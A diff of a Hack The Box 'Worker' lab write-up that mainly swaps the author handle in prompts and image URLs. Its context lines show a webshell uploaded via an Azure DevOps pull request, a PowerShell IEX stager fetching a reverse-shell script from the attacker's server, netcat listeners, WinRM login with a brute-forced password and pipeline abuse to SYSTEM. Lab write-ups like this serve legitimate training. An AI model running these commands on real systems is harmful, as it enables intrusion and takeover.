@@ -9,6 +9,7 @@ avatar: assets/htb/worker.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Worker
 ---
+
 ## Useful Skills and Tools
 
 ### Interactive Windows Command/Tool List
@@ -24,7 +25,7 @@ htb_url: https://app.hackthebox.com/machines/Worker
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ nmap -sCV -n -p- -v <YOUR_IP>                                                                   
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-28 18:40 EST
 NSE: Loaded 153 scripts for scanning.
@@ -88,7 +89,7 @@ Nmap done: 1 IP address (1 host up) scanned in 113.30 seconds
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-default-iis.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-default-iis.png)
 
 nothing but default IIS on port 80, dirbuster revealed nothing of use
 
@@ -103,7 +104,7 @@ nothing but default IIS on port 80, dirbuster revealed nothing of use
 installed subversion `sudo apt install subversion`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ svn checkout http://<YOUR_IP> 
 svn: E170013: Unable to connect to a repository at URL 'http://<YOUR_IP>'
 svn: E175003: The server at 'http://<YOUR_IP>' does not support the HTTP/DAV protocol
@@ -112,7 +113,7 @@ svn: E175003: The server at 'http://<YOUR_IP>' does not support the HTTP/DAV pro
 Was not able to connect the to page as HTTP, but after some reading found that there is a `SVN://` protocol.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ svn checkout svn://<YOUR_IP>
 A    dimension.worker.htb
 A    dimension.worker.htb/LICENSE.txt
@@ -195,13 +196,13 @@ You can find the latest version at: http://devops.worker.htb
 
 The file `moved.txt` contained a message stating that the repo has been moved to another castle `devops.worker.htb`. I added this one to my hosts file as well
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-more-virtual-hosts.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-more-virtual-hosts.png)
 
 ```text
      <!-- Work -->
              <article id="work">
                      <h2 class="major">Work</h2>
-                     <span class="image main"><img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master/images/pic02.jpg" alt="" /></span>
+                     <span class="image main"><img src="https://raw.githubusercontent.com/kac0/htb-writeups/master/images/pic02.jpg" alt="" /></span>
                      <p>Curios on what we're currently working on are you? Well let's please you with a couple of teasers.</p>
                      <a href="http://alpha.worker.htb/">Alpha</a><p>This is our first page</p>
                      <a href="http://cartoon.worker.htb/">Cartoon</a><p>When we're not working we enjoy watching cartoons. Guess who in our team is what cartoon character!</p>
@@ -213,24 +214,24 @@ The file `moved.txt` contained a message stating that the repo has been moved to
 
 The file `index.html` contained another list of subdomains; again added to hosts
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-dimension-worker.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dimension-worker.png)
 
 Worker homepage using dimension theme
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-work.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-work.png)
 
 Links to other pages
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-cartoon.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-cartoon.png)
 
 Cartoon character page, possible usernames?  The other pages did not contain anything that looked useful, so moved on to the `devops` domain I found earlier.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-devops-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-devops-login.png)
 
 The `devops` page required authentication
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn log svn://devops.worker.htb
 ------------------------------------------------------------------------
 r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line
@@ -258,7 +259,7 @@ First version
 Next, I used the `log` command and found the commit notes that described some of the progress that had been made on the repository.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 1                                                                                   1 ⨯
 Index: moved.txt
 ===================================================================
@@ -271,7 +272,7 @@ Index: moved.txt
 +// The Worker team :)
 +
 
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 2
 Index: deploy.ps1
 ===================================================================
@@ -295,7 +296,7 @@ Index: moved.txt
 +// The Worker team :)
 +
 
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 3
 Index: deploy.ps1
 ===================================================================
@@ -321,7 +322,7 @@ Index: moved.txt
 +// The Worker team :)
 +
 
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 4
 Index: moved.txt
 ===================================================================
@@ -334,7 +335,7 @@ Index: moved.txt
 +// The Worker team :)
 +
 
-┌──(zweilos㉿kali)-[~/htb/worker/devops]
+┌──(kac0㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 5
 ```
 
@@ -349,33 +350,33 @@ This credential set did not work for logging into the devops page, nor for WinRM
 
 ### The Azure DevOps Portal
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-ekenas.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-ekenas.png)
 
 [https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
 
 After logging in, I found myself in a Azure DevOps portal as the user named `ekenas`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-profile.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-profile.png)
 
 When I clicked on the profile picture, I found the user's name and domain login information.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-notifications.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-notifications.png)
 
 I checked through the user's settings, but there wasn't anything useful. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-smarthotel.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-smarthotel.png)
 
 Under the `ekenas` repository, there was a project for something called `SmartHotel360`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-restorer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-restorer.png)
 
 Under the Members section of the project I found icons for 2 other users.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-smarth-repo.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-smarth-repo.png)
 
 template for a page?
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-w4styt4st.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-w4styt4st.png)
 
 Under SmartHotel360 there was a mostly empty project called `w45ty45t`.
 
@@ -387,7 +388,7 @@ None of the usernames or potential passwords got me anywhere, so I began to look
 
 lots of screenshots -&gt; description - had to: 1. create new branch 2. upload file to new branch 3. add work item to commit 4. approve commit 5. wait for build to complete 6. merge with master 7. navigate to webshell
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-nopull%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-nopull%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
 ```text
 TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
@@ -395,15 +396,15 @@ TF402455: Pushes to this branch are not permitted; you must use a pull request t
 
 Tried to push a file uploaded through the web portal but got the above message
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-testbranch.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-testbranch.png)
 
 Tried creating a new branch of the project called `test`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-limited-time.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-limited-time.png)
 
 The build takes so long that the cleanup takes place too quickly to do anything... \(I think I must have finished creating my test branch just before the cleanup script or whatever cleared it the first time I did this\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-fixed-pull.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-fixed-pull.png)
 
 Next I created a new pull request, trying to upload an `.aspx` file to see if I could get code execution.
 
@@ -454,27 +455,27 @@ Response.Write("</pre>");
 
 The asp.net webshell by Dominic Chell, downloaded from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx).
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-upload-approve.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-approve.png)
 
 After I submitted the pull request I had to approve it.  Luckily this user had the necessary permissions.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test--pull.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test--pull.png)
 
 Approved the file pull request and completed it.  If you have problems, make sure to check the `Policies` section on the right, as it does checks that have to be met first.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-uploaded.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-uploaded.png)
 
 My test branches were deleted multiple times before I figured out the rhythm of the portal and how to do everything.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-upload-fail.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-fail.png)
 
 Tried to access my web shell, but it said it wasn't there...
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-upload--link-work-first.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload--link-work-first.png)
 
 Next I merged my test branch into the master
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-test-upload-win.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-win.png)
 
 After a lot of trial and error, I was able to upload my webshell, and tried to run a reverse shell script from my attack machine.
 
@@ -485,7 +486,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10
 Put this command into the webshell input as a stager to get my reverse shell powershell script from my waiting python http server
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 <YOUR_IP> - - [12/Dec/2020 17:35:03] "GET /revShell.ps1 HTTP/1.1" 200 -
@@ -502,10 +503,10 @@ My PowerShell script consisted of a reverse shell one-liner found on [https://gi
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ script                                                                                          1 ⨯
 Script started, output log file is 'typescript'.
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 50339
@@ -974,7 +975,7 @@ used `winrm-brute` to cycle through the list of usernames and passwords
 Retrieved the password for one of the users `robisl`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker/winrm-brute]
+┌──(kac0㉿kali)-[~/htb/worker/winrm-brute]
 └─$ evil-winrm -u robisl -p wolves11 -i <YOUR_IP>                                      
 
 Evil-WinRM shell v2.3
@@ -1030,7 +1031,7 @@ Mode                LastWriteTime         Length Name
 -ar---       12/12/2020  10:16 PM             34 user.txt
 
 *Evil-WinRM* PS C:\Users\robisl\Desktop> cat user.txt
-6266****2a34
+6266************************2a34
 ```
 
 On the user's desktop I found the `user.txt` flag
@@ -1041,15 +1042,15 @@ On the user's desktop I found the `user.txt` flag
 
 After searching high and low and enumerating as much as I could, I didn't find anything useful.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-sign-inas.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sign-inas.png)
 
 I tried to switch users to `robisl` in the `devops` portal.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-sign-inas-fail%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sign-inas-fail%2520%25281%2529.png)
 
 I tried switching users in the `devops` page I had open, but received an error message saying that this user did not have the permissions needed to view project-level information.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-partsunlimited.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-partsunlimited.png)
 
  I decided to try `robisl`'s credentials on a fresh `devops` page after closing it and clearing my cache, and was happy to see that I was logged in to a different project.
 
@@ -1058,42 +1059,42 @@ I tried switching users in the `devops` page I had open, but received an error m
 
 > Azure Pipelines provides a quick, easy, and safe way to automate building your projects and making them available to users.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-pipeline.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-pipeline.png)
 
 This sounds like a good way to try to get code execution...I wonder if there is a way to run it in the context of `Administrator`?  I put some code in the `azure-pipelines.yml` that I hoped would execute and download my reverse shell script.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-build-failed%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-build-failed%2520%25281%2529.png)
 
 Unfortunately this did not work.  After doing even more reading, I found that I had to assign an agent from the pool to build the project.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-agent-pool-setup%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-agent-pool-setup%2520%25281%2529.png)
 
 Agetnt pool selection
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-agent-pool-setup2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-agent-pool-setup2.png)
 
 Assign the job to the agent
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-run.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-run.png)
 
 Save and run
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-building%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-building%2520%25281%2529.png)
 
 The build job was started
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-success%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-success%2520%25281%2529.png)
 
 The job built successfully, but my script failed to run. I checked my syntax on everything and made sure I did all of the proper steps and tried again.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-success2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-success2.png)
 
 Unfortunately I don't remember exactly what I had done wrong, or how I fixed it \(I need to take more detailed notes, I guess!\).  However, after a lot of trial and error, I was able to get the project to build and also execute my script.  No I hoped that it would actually execute the PowerShell script and send me a reverse shell!
 
 New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 <YOUR_IP> - - [12/Dec/2020 20:32:32] "GET /revShell.ps1 HTTP/1.1" 200 -
@@ -1104,7 +1105,7 @@ My waiting python HTTP server got a connection request, and I could see that it 
 ### Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 51544
@@ -1184,7 +1185,7 @@ I was happy to see that my script worked, and I got a reverse shell as `NT Autho
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/worker]
+┌──(kac0㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                         
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 51686
@@ -1192,5 +1193,5 @@ type C:\Administrator\Desktop\root.txt
 PS W:\agents\agent11\_work\10\s> cd C:\
 PS C:\> cd \users\Administrator\Desktop
 PS C:\users\Administrator\Desktop> type root.txt
-8af8****9add
+8af8************************9add
 ```
